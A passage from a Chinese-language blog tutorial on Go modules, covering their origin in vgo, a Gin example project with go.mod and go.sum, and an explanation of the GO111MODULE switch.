&#x201C;&#x987A;&#x7406;&#x6210;&#x7AE0;&#x201D; &#x5730;&#x5347;&#x7EA7;&#x4E3A; go toolchain &#x4E00;&#x90E8;&#x5206;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4ECA;&#x5E74;&#x5E74;&#x521D;&#xFF0C;Go &#x6838;&#x5FC3; Team &#x7684;&#x6280;&#x672F; leader&#xFF0C;&#x4E5F;&#x662F; Go Team &#x6700;&#x65E9;&#x671F;&#x6210;&#x5458;&#x4E4B;&#x4E00;&#x7684; <a href="https://research.swtch.com/" target="_blank" rel="noopener">Russ Cox</a> &#x5728;<a href="https://research.swtch.com/" target="_blank" rel="noopener">&#x4E2A;&#x4EBA;&#x535A;&#x5BA2;</a>&#x4E0A;&#x8FDE;&#x7EED;&#x53D1;&#x8868;&#x4E86;<a href="https://research.swtch.com/vgo" target="_blank" rel="noopener">&#x4E03;&#x7BC7;&#x6587;&#x7AE0;</a>&#xFF0C;&#x7CFB;&#x7EDF;&#x9610;&#x8FF0;&#x4E86; Go team &#x89E3;&#x51B3;&#x201D; &#x5305;&#x4F9D;&#x8D56;&#x7BA1;&#x7406;&#x201D; &#x7684;&#x6280;&#x672F;&#x65B9;&#x6848;: <a href="https://github.com/golang/vgo" target="_blank" rel="noopener">vgo</a> &#x2014;&#x2014; modules &#x7684;&#x524D;&#x8EAB;&#x3002;</p><p>vgo &#x7684;&#x4E3B;&#x8981;&#x601D;&#x8DEF;&#x5305;&#x62EC;&#xFF1A;<a href="https://research.swtch.com/vgo-import" target="_blank" rel="noopener">Semantic Import Versioning</a>&#x3001;<a href="https://research.swtch.com/vgo-mvs" target="_blank" rel="noopener">Minimal Version Selection</a>&#x3001;<a href="https://research.swtch.com/vgo-module" target="_blank" rel="noopener">&#x5F15;&#x5165; Go module</a> &#x7B49;&#x3002;&#x8FD9;&#x4E03;&#x7BC7;&#x6587;&#x7AE0;&#x7684;&#x53D1;&#x5E03;&#x5F15;&#x53D1;&#x4E86; Go &#x793E;&#x533A;&#x6FC0;&#x70C8;&#x5730;&#x4E89;&#x8BBA;&#xFF0C;&#x5C24;&#x5176;&#x662F; MVS(&#x6700;&#x5C0F;&#x7248;&#x672C;&#x9009;&#x62E9;) &#x4E0E;&#x76EE;&#x524D;&#x4E3B;&#x6D41;&#x7684;&#x4F9D;&#x8D56;&#x7248;&#x672C;&#x9009;&#x62E9;&#x65B9;&#x6CD5;&#x7684;&#x76F8;&#x6096;&#x8BA9;&#x5F88;&#x591A;&#x4F20;&#x7EDF; Go &#x5305;&#x7BA1;&#x7406;&#x5DE5;&#x5177;&#x7684;&#x7EF4;&#x62A4;&#x8005;&#x201D; &#x4E0D;&#x6EE1;&#x201D;&#xFF0C;&#x5C24;&#x5176;&#x662F;&#x201D; &#x51C6;&#x5B98;&#x65B9;&#x5DE5;&#x5177;&#x201D;&#xFF1A;dep&#x3002;vgo &#x65B9;&#x6848;&#x7684;&#x63D0;&#x51FA;&#x4E5F;&#x610F;&#x5473;&#x7740; dep &#x9879;&#x76EE;&#x7684;&#x751F;&#x547D;&#x5468;&#x671F;&#x5373;&#x5C06;&#x8FDB;&#x5165;&#x5C3E;&#x58F0;&#x3002;</p><p>5 &#x6708;&#x4EFD;&#xFF0C;Russ Cox &#x7684; <a href="https://github.com/golang/go/issues/24301" target="_blank" rel="noopener">Proposal &#x201C;cmd/go: add package version support to Go toolchain&#x201D; </a>&#x88AB; accepted&#xFF0C;&#x8FD9;&#x5468;&#x4E94;&#x65E9;&#x4E9B;&#x65F6;&#x5019; Russ Cox <a href="https://github.com/golang/go/commit/f7248f05946c1804b5519d0b3eb0db054dc9c5d6" target="_blank" rel="noopener">&#x5C06; vgo &#x7684;&#x4EE3;&#x7801; merge &#x5230; Go &#x4E3B;&#x5E72;</a>&#xFF0C;&#x5E76;&#x5C06;&#x8FD9;&#x5957;&#x673A;&#x5236;&#x6B63;&#x5F0F;&#x547D;&#x540D;&#x4E3A;&#x201D;go modules&#x201D;&#x3002;&#x7531;&#x4E8E; vgo &#x9879;&#x76EE;&#x672C;&#x8EAB;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5B9E;&#x9A8C;&#x539F;&#x578B;&#xFF0C;merge &#x5230;&#x4E3B;&#x5E72;&#x540E;&#xFF0C;vgo &#x8FD9;&#x4E2A;&#x672F;&#x8BED;&#x4EE5;&#x53CA; vgo &#x9879;&#x76EE;&#x7684;&#x4F7F;&#x547D;&#x4E5F;&#x5C31;&#x5C31;&#x6B64;&#x7ED3;&#x675F;&#x4E86;&#x3002;&#x540E;&#x7EED; Go modules &#x673A;&#x5236;&#x5C06;&#x76F4;&#x63A5;&#x5728; Go &#x4E3B;&#x5E72;&#x4E0A;&#x7EE7;&#x7EED;&#x6F14;&#x5316;&#x3002;</p><p>Go modules &#x662F; Go team &#x5728;&#x89E3;&#x51B3;&#x5305;&#x4F9D;&#x8D56;&#x7BA1;&#x7406;&#x65B9;&#x9762;&#x7684;&#x4E00;&#x6B21;&#x52C7;&#x6562;&#x5C1D;&#x8BD5;&#xFF0C;&#x65E0;&#x8BBA;&#x5982;&#x4F55;&#xFF0C;&#x5BF9; Go &#x8BED;&#x8A00;&#x6765;&#x8BF4;&#x90FD;&#x662F;&#x4E00;&#x4E2A;&#x597D;&#x4E8B;&#x3002;</p><h2 id="Go-modules-&#x4E0A;&#x624B;"><a href="#Go-modules-&#x4E0A;&#x624B;" class="headerlink" title="Go modules &#x4E0A;&#x624B;"></a>Go modules &#x4E0A;&#x624B;</h2><p>&#x8FD9;&#x91CC;&#x5C31;&#x7528; Gin &#x6846;&#x67B6;&#x6765;&#x5B9E;&#x73B0;&#x4E24;&#x4E2A; RESTful API &#x4F5C;&#x793A;&#x4F8B;&#x5427;&#xFF0C;&#x76EE;&#x5F55;&#x7ED3;&#x6784;&#x5982;&#x4E0B;&#xFF0C;&#x4E24;&#x4E2A; handler &#x5206;&#x522B;&#x5C5E;&#x4E8E; <code>main</code> &#x548C; <code>pkg/api/data</code> &#x8FD9;&#x4E24;&#x4E2A; package<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mytest</span><br><span class="line">&#x251C;&#x2500;&#x2500; main.<span class="keyword">go</span></span><br><span class="line">&#x2514;&#x2500;&#x2500; pkg</span><br><span class="line">    &#x2514;&#x2500;&#x2500; api</span><br><span class="line">        &#x2514;&#x2500;&#x2500; data</span><br><span class="line">            &#x2514;&#x2500;&#x2500; api.<span class="keyword">go</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FDB;&#x5165; myproj &#x76EE;&#x5F55;&#xFF0C;&#x7136;&#x540E;&#x4F7F;&#x7528; <code>go mod</code> &#x5EFA;&#x7ACB; modules<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">go</span> mod init github.com/wangjiemin/mytest</span><br><span class="line"><span class="keyword">go</span>: creating <span class="built_in">new</span> <span class="keyword">go</span>.mod: module github.com/wangjiemin/mytest</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6B64;&#x65F6;&#x4F1A;&#x81EA;&#x52A8;&#x4EA7;&#x751F;&#x4E00;&#x4E2A; go.mod &#x6587;&#x4EF6;&#xFF0C;&#x6253;&#x5F00;&#x770B;&#x5230;&#x91CC;&#x8FB9;&#x5185;&#x5BB9;&#x53EA;&#x6709;&#x4E00;&#x884C;<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">module github.com/wangjiemin/mytest</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x73B0;&#x5728;&#x5F00;&#x59CB;&#x5199;&#x6211;&#x4EEC;&#x7684;&#x4E24;&#x4E2A; handler<br>1.pkg/api/data/api.go<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetDataAPIHealthHandler GET /health-dataapi to expose heathy check result of data API</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetDataAPIHealthHandler</span><span class="params">(c *gin.Context)</span></span> {</span><br><span class="line">    <span class="comment">// do something to check heathy of data API</span></span><br><span class="line">    c.JSON(http.StatusOK, gin.H{</span><br><span class="line">        <span class="string">&quot;code&quot;</span>:    <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Data API is alive&quot;</span>,</span><br><span class="line">    })</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>2.main.go<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    dataapi <span class="string">&quot;github.com/wangjiemin/mytest/pkg/api/data&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">    router := gin.Default()</span><br><span class="line"></span><br><span class="line">    router.GET(<span class="string">&quot;/health&quot;</span>, GetHealthHandler)</span><br><span class="line">    router.GET(<span class="string">&quot;/health-dataapi&quot;</span>, dataapi.GetDataAPIHealthHandler)</span><br><span class="line"></span><br><span class="line">    s := &amp;http.Server{</span><br><span class="line">        Addr:    <span class="string">&quot;:8000&quot;</span>,</span><br><span class="line">        Handler: router,</span><br><span class="line">    }</span><br><span class="line">    s.ListenAndServe()</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetHealthHandler - GET /health to expose service health</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetHealthHandler</span><span class="params">(c *gin.Context)</span></span> {</span><br><span class="line">    c.JSON(http.StatusOK, gin.H{</span><br><span class="line">        <span class="string">&quot;code&quot;</span>:    <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Service is alive!&quot;</span>,</span><br><span class="line">    })</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7136;&#x540E;&#x7528;&#x6211;&#x4EEC;&#x7684;&#x8001;&#x670B;&#x53CB; <code>go build</code> &#x521B;&#x5EFA;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">go</span> build -o bin/main main.<span class="keyword">go</span></span><br><span class="line"><span class="keyword">go</span>: finding github.com/gin-gonic/gin v1<span class="number">.3</span><span class="number">.0</span></span><br><span class="line"><span class="keyword">go</span>: downloading github.com/gin-gonic/gin v1<span class="number">.3</span><span class="number">.0</span></span><br><span class="line"><span class="keyword">go</span>: finding github.com/gin-contrib/sse latest</span><br><span class="line"><span class="keyword">go</span>: finding github.com/ugorji/<span class="keyword">go</span>/codec latest</span><br><span class="line"><span class="keyword">go</span>: finding github.com/golang/protobuf/proto latest</span><br><span class="line"><span class="keyword">go</span>: finding github.com/mattn/<span class="keyword">go</span>-isatty v0<span class="number">.0</span><span class="number">.4</span></span><br><span class="line"><span class="keyword">go</span>: finding gopkg.in/yaml.v2 v2<span class="number">.2</span><span class="number">.1</span></span><br><span class="line"><span class="keyword">go</span>: finding gopkg.in/<span class="keyword">go</span>-playground/validator.v8 v8<span class="number">.18</span><span class="number">.2</span></span><br><span class="line"><span class="keyword">go</span>: downloading github.com/gin-contrib/sse v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20170109093832</span><span class="number">-22d</span>885f9ecc7</span><br><span class="line"><span class="keyword">go</span>: downloading github.com/mattn/<span class="keyword">go</span>-isatty v0<span class="number">.0</span><span class="number">.4</span></span><br><span class="line"><span class="keyword">go</span>: downloading github.com/ugorji/<span class="keyword">go</span>/codec v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20181022190402</span>-e5e69e061d4f</span><br><span class="line"><span class="keyword">go</span>: finding github.com/golang/protobuf v1<span class="number">.2</span><span class="number">.0</span></span><br><span class="line"><span class="keyword">go</span>: downloading gopkg.in/yaml.v2 v2<span class="number">.2</span><span class="number">.1</span></span><br><span class="line"><span class="keyword">go</span>: downloading gopkg.in/<span class="keyword">go</span>-playground/validator.v8 v8<span class="number">.18</span><span class="number">.2</span></span><br><span class="line"><span class="keyword">go</span>: downloading github.com/golang/protobuf v1<span class="number">.2</span><span class="number">.0</span></span><br><span class="line"><span class="keyword">go</span>: finding gopkg.in/check.v1 v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20161208181325</span><span class="number">-20d</span>25e280405</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230; go compiler &#x4E3B;&#x52A8;&#x4E0B;&#x8F7D;&#x4E86;&#x76F8;&#x5173; package&#x3002;</p><p>&#x90A3;&#x4E48;&#x8FD9;&#x4E9B; package &#x88AB;&#x4E0B;&#x8F7D;&#x5230;&#x4E86;&#x54EA;&#x91CC;&#x5462;&#xFF0C;&#x4F60;&#x6253;&#x5F00; $GOPATH/pkg/mod &#x5C31;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x4E86;&#xFF0C;&#x53E6;&#x5916; modules &#x662F;&#x5141;&#x8BB8;&#x540C; package &#x591A;&#x79CD;&#x7248;&#x672C;&#x5E76;&#x5B58;&#x7684;&#x3002;<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">~/<span class="keyword">go</span>/pkg/mod</span><br><span class="line">&#x251C;&#x2500;&#x2500; cache</span><br><span class="line">&#x2502;   &#x251C;&#x2500;&#x2500; download</span><br><span class="line">&#x2502;   &#x2502;   &#x251C;&#x2500;&#x2500; github.com</span><br><span class="line">&#x2502;   &#x2502;   &#x2514;&#x2500;&#x2500; gopkg.in</span><br><span class="line">&#x2502;   &#x2514;&#x2500;&#x2500; vcs</span><br><span class="line">&#x2502;       &#x251C;&#x2500;&#x2500; <span class="number">37981</span>a5904034a62f98c21341f5422b08cc21ccf1bea734e2aafc91119af6c9b</span><br><span class="line">&#x2502;       &#x251C;&#x2500;&#x2500; <span class="number">37981</span>a5904034a62f98c21341f5422b08cc21ccf1bea734e2aafc91119af6c9b.info</span><br><span class="line">&#x2502;       &#x251C;&#x2500;&#x2500; <span class="number">3</span>cef6ea433a84771f272e076cd77b94bd94828b89b4ccd04fa8622bf2d5d3a3f</span><br><span class="line">&#x2502;       &#x251C;&#x2500;&#x2500; <span class="number">3</span>cef6ea433a84771f272e076cd77b94bd94828b89b4ccd04fa8622bf2d5d3a3f.info</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x770B;&#x770B;&#x6267;&#x884C; <code>go build</code> &#x540E; go.mod &#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;&#xFF1A;<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">module github.com/wangjiemin/mytest</span><br><span class="line"></span><br><span class="line">require (</span><br><span class="line">  github.com/gin-contrib/sse v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20170109093832</span><span class="number">-22d</span>885f9ecc7 <span class="comment">// indirect</span></span><br><span class="line">  github.com/gin-gonic/gin v1<span class="number">.3</span><span class="number">.0</span></span><br><span class="line">  github.com/golang/protobuf v1<span class="number">.2</span><span class="number">.0</span> <span class="comment">// indirect</span></span><br><span class="line">  github.com/mattn/<span class="keyword">go</span>-isatty v0<span class="number">.0</span><span class="number">.4</span> <span class="comment">// indirect</span></span><br><span class="line">  github.com/ugorji/<span class="keyword">go</span>/codec v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20181022190402</span>-e5e69e061d4f <span class="comment">// indirect</span></span><br><span class="line">  gopkg.in/<span class="keyword">go</span>-playground/validator.v8 v8<span class="number">.18</span><span class="number">.2</span> <span class="comment">// indirect</span></span><br><span class="line">  gopkg.in/yaml.v2 v2<span class="number">.2</span><span class="number">.1</span> <span class="comment">// indirect</span></span><br><span class="line">)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6211;&#x4EEC;&#x770B;&#x5230; go modules &#x5206;&#x6790;&#x51FA;&#x4E86; mytest &#x7684;&#x4F9D;&#x8D56;&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x653E;&#x5165; go.mod &#x7684; require &#x533A;&#x57DF;&#x3002;</p><blockquote><p>go modules &#x62C9;&#x53D6; package &#x7684;&#x539F;&#x5219;&#x662F;&#x5148;&#x62C9;&#x53D6;&#x6700;&#x65B0;&#x7684; release tag&#xFF0C;&#x82E5;&#x65E0; tag &#x5219;&#x62C9;&#x6700;&#x65B0; commit &#x5E76;&#x4EE5; Pseudo-versions &#x7684;&#x5F62;&#x5F0F;&#x8BB0;&#x5F55;&#x3002;<br>&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x7684; module &#x53EA;&#x76F4;&#x63A5;&#x4F9D;&#x8D56;&#x4E86; gin&#xFF0C;&#x5176;&#x4ED6;&#x7684;&#x90FD;&#x662F;&#x975E;&#x76F4;&#x63A5;&#x4F9D;&#x8D56;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x5B83;&#x4EEC;&#x540E;&#x8FB9;&#x90FD;&#x88AB;&#x4EE5;&#x6CE8;&#x91CA;&#x5F62;&#x5F0F;&#x6807;&#x8BB0;&#x4E86; indirect&#xFF0C;&#x5373;&#x4F20;&#x9012;&#x4F9D;&#x8D56;&#x3002;<br>go.mod &#x6587;&#x4EF6;&#x4E00;&#x65E6;&#x521B;&#x5EFA;&#x540E;&#xFF0C;&#x5B83;&#x7684;&#x5185;&#x5BB9;&#x5C06;&#x4F1A;&#x88AB; go toolchain &#x5168;&#x9762;&#x638C;&#x63A7;&#x3002;go toolchain &#x4F1A;&#x5728;&#x5404;&#x7C7B;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x65F6;&#xFF0C;&#x6BD4;&#x5982; go get&#x3001;go build&#x3001;go mod &#x7B49;&#x4FEE;&#x6539;&#x548C;&#x7EF4;&#x62A4; go.mod &#x6587;&#x4EF6;&#x3002;</p></blockquote><p>&#x540C;&#x65F6;&#x53D1;&#x73B0;&#x76EE;&#x5F55;&#x4E0B;&#x591A;&#x4E86;&#x4E00;&#x4E2A;&#x6587;&#x4EF6; go.sum<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">github.com/gin-contrib/sse v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20170109093832</span><span class="number">-22d</span>885f9ecc7 h1:AzN37oI0cOS+cougNAV9szl6CVoj2RYwzS3DpUQNtlY=</span><br><span class="line">github.com/gin-contrib/sse v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20170109093832</span><span class="number">-22d</span>885f9ecc7/<span class="keyword">go</span>.mod h1:VJ0WA2NBN22VlZ2dKZQPAPnyWw5XTlK1KymzLKsr59s=</span><br><span class="line">github.com/gin-gonic/gin v1<span class="number">.3</span><span class="number">.0</span> h1:kCmZyPklC0gVdL728E6Aj20uYBJV93nj/TkwBTKhFbs=</span><br><span class="line">github.com/gin-gonic/gin v1<span class="number">.3</span><span class="number">.0</span>/<span class="keyword">go</span>.mod h1:<span class="number">7</span>cKuhb5qV2ggCFctp2fJQ+ErvciLZrIeoOSOm6mUr7Y=</span><br><span class="line">github.com/golang/protobuf v1<span class="number">.2</span><span class="number">.0</span> h1:P3YflyNX/ehuJFLhxviNdFxQPkGK5cDcApsge1SqnvM=</span><br><span class="line">github.com/golang/protobuf v1<span class="number">.2</span><span class="number">.0</span>/<span class="keyword">go</span>.mod h1:<span class="number">6l</span>Qm79b+lXiMfvg/cZm0SGofjICqVBUtrP5yJMmIC1U=</span><br><span class="line">github.com/mattn/<span class="keyword">go</span>-isatty v0<span class="number">.0</span><span class="number">.4</span> h1:bnP0vzxcAdeI1zdubAl5PjU6zsERjGZb7raWodagDYs=</span><br><span class="line">github.com/mattn/<span class="keyword">go</span>-isatty v0<span class="number">.0</span><span class="number">.4</span>/<span class="keyword">go</span>.mod h1:M+lRXTBqGeGNdLjl/ufCoiOlB5xdOkqRJdNxMWT7Zi4=</span><br><span class="line">github.com/ugorji/<span class="keyword">go</span>/codec v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20181022190402</span>-e5e69e061d4f h1:y3Vj7GoDdcBkxFa2RUUFKM25TrBbWVDnjRDI0u975zQ=</span><br><span class="line">github.com/ugorji/<span class="keyword">go</span>/codec v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20181022190402</span>-e5e69e061d4f/<span class="keyword">go</span>.mod h1:VFNgLljTbGfSG7qAOspJ7OScBnGdDN/yBr0sguwnwf0=</span><br><span class="line">gopkg.in/check.v1 v0<span class="number">.0</span><span class="number">.0</span><span class="number">-20161208181325</span><span class="number">-20d</span>25e280405/<span class="keyword">go</span>.mod h1:Co6ibVJAznAaIkqp8huTwlJQCZ016jof/cbN4VW5Yz0=</span><br><span class="line">gopkg.in/<span class="keyword">go</span>-playground/validator.v8 v8<span class="number">.18</span><span class="number">.2</span> h1:lFB4DoMU6B626w8ny76MV7VX6W2VHct2GVOI3xgiMrQ=</span><br><span class="line">gopkg.in/<span class="keyword">go</span>-playground/validator.v8 v8<span class="number">.18</span><span class="number">.2</span>/<span class="keyword">go</span>.mod h1:RX2a/<span class="number">7</span>Ha8BgOhfk7j780h4/u/RRjR0eouCJSH80/M2Y=</span><br><span class="line">gopkg.in/yaml.v2 v2<span class="number">.2</span><span class="number">.1</span> h1:mUhvW9EsL+naU5Q3cakzfE91YhliOondGd6ZrsDBHQE=</span><br><span class="line">gopkg.in/yaml.v2 v2<span class="number">.2</span><span class="number">.1</span>/<span class="keyword">go</span>.mod h1:hI93XBmqTisBFMUTm0b8Fm+jr3Dg1NNxqwp+<span class="number">5</span>A1VGuI=</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5199;&#x8FC7; node &#x7684;&#x4EBA;&#x5E94;&#x8BE5;&#x4F1A;&#x53D1;&#x73B0;&#xFF0C; <code>go.mod/go.sum</code> &#x7684;&#x5173;&#x7CFB;&#x8DDF; <code>package.json/package-lock.json</code> &#x7C7B;&#x4F3C;&#xFF0C;&#x524D;&#x8005;&#x5B9A;&#x4E49; dependency root&#xFF0C;&#x540E;&#x8005;&#x5C06;&#x5173;&#x7CFB;&#x5C55;&#x5F00;&#x3002;</p><p>&#x6700;&#x540E;&#x6267;&#x884C; <code>bin/main</code> &#x53EF;&#x4EE5;&#x770B;&#x5230; Gin &#x5F88;&#x8D34;&#x5FC3;&#x7684;&#x5217;&#x51FA;&#x4E86; handler &#x6240;&#x5C5E;&#x7684; package<br></p><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ./bin/main</span><br><span class="line">[GIN-debug] [WARNING] Now Gin requires Go <span class="number">1.6</span> or later and Go <span class="number">1.7</span> will be required soon.</span><br><span class="line"></span><br><span class="line">[GIN-debug] [WARNING] Creating an Engine instance with the Logger and Recovery middleware already attached.</span><br><span class="line"></span><br><span class="line">[GIN-debug] [WARNING] Running in <span class="string">&quot;debug&quot;</span> mode. Switch to <span class="string">&quot;release&quot;</span> mode in production.</span><br><span class="line"> - using env: export GIN_MODE=release</span><br><span class="line"> - using code: gin.SetMode(gin.ReleaseMode)</span><br><span class="line"></span><br><span class="line">[GIN-debug] GET    /health                   --&gt; main.GetHealthHandler (<span class="number">3</span> handlers)</span><br><span class="line">[GIN-debug] GET    /health-dataapi           --&gt; github.com/wangjiemin/mytest/pkg/api/data.GetDataAPIHealthHandler (<span class="number">3</span> handlers)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5230;&#x8FD9;&#x91CC;&#xFF0C;&#x4E00;&#x4E2A; go modules &#x5C31;&#x5B8C;&#x6210;&#x4E86;&#x3002;</p><h4 id="GO111MODULE"><a href="#GO111MODULE" class="headerlink" title="GO111MODULE"></a>GO111MODULE</h4><p>Modules &#x662F;&#x4F5C;&#x4E3A; experiment feature &#x52A0;&#x5165;&#x5230;&#x4E0D;&#x4E45;&#x524D;&#x6B63;&#x5F0F;&#x53D1;&#x5E03;&#x7684; Go 1.11 &#x4E2D;&#x7684;&#x3002;</p><p>&#x6309;&#x7167; Go &#x7684;&#x60EF;&#x4F8B;&#xFF0C;&#x5728;&#x65B0;&#x7684; experiment feature &#x9996;&#x6B21;&#x52A0;&#x5165;&#x65F6;&#xFF0C;&#x90FD;&#x4F1A;&#x6709;&#x4E00;&#x4E2A;&#x7279;&#x6027;&#x5F00;&#x5173;&#xFF0C;go modules &#x4E5F;&#x4E0D;&#x4F8B;&#x5916;&#xFF0C;<code>GO111MODULE</code> &#x8FD9;&#x4E2A;&#x4E34;&#x65F6;&#x7684;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x5C31;&#x662F; go modules &#x7279;&#x6027;&#x7684; experiment &#x5F00;&#x5173;&#x3002;</p><ul><li>off: go modules experiment feature &#x5173;&#x95ED;&#xFF0C;go compiler &#x4F1A;&#x59CB;&#x7EC8;&#x4F7F;&#x7528; GOPATH mode&#xFF0C;&#x5373;&#x65E0;&#x8BBA;&#x8981;&#x6784;&#x5EFA;&#x7684;&#x6E90;&#x7801;&#x76EE;&#x5F55;&#x662F;&#x5426;&#x5728; GOPATH &#x8DEF;&#x5F84;&#x4E0B;&#xFF0C;go compiler &#x90FD;&#x4F1A;&#x5728;&#x4F20;&#x7EDF;&#x7684; GOPATH &#x548C; vendor &#x76EE;&#x5F55; (&#x4EC5;&#x652F;&#x6301;&#x5728; GOPATH &#x76EE;&#x5F55;&#x4E0B;&#x7684; package) &#x4E0B;&#x641C;&#x7D22;&#x76EE;&#x6807;&#x7A0B;&#x5E8F;&#x4F9D;&#x8D56;&#x7684; go package&#xFF1B;</li><li>on: &#x59CB;&#x7EC8;&#x4F7F;&#x7528; module-aware mode&#xFF0C;&#x53EA;&#x6839;&#x636E; go.mod &#x4E0B;&#x8F7D; dependency &#x800C;&#x5B8C;&#x5168;&#x5FFD;&#x7565; GOPATH &#x4EE5;&#x53CA; vendor &#x76EE;&#x5F55;</li></ul><ul><li>auto: Golang 1.11 &#x9884;&#x8BBE;&#x503C;&#xFF0C;&#x4F7F;&#x7528; GOPATH mode &#x8FD8;&#x662F; module-aware mode&#xFF0C;&#x53D6;&#x51B3;&#x4E8E;&#x8981;&#x6784;&#x5EFA;&#x7684;&#x6E90;&#x7801;&#x76EE;&#x5F55;&#x6240;&#x5728;&#x4F4D;&#x7F6E;&#x4EE5;&#x53CA;&#x662F;&#x5426;&#x5305;&#x542B; go.mod 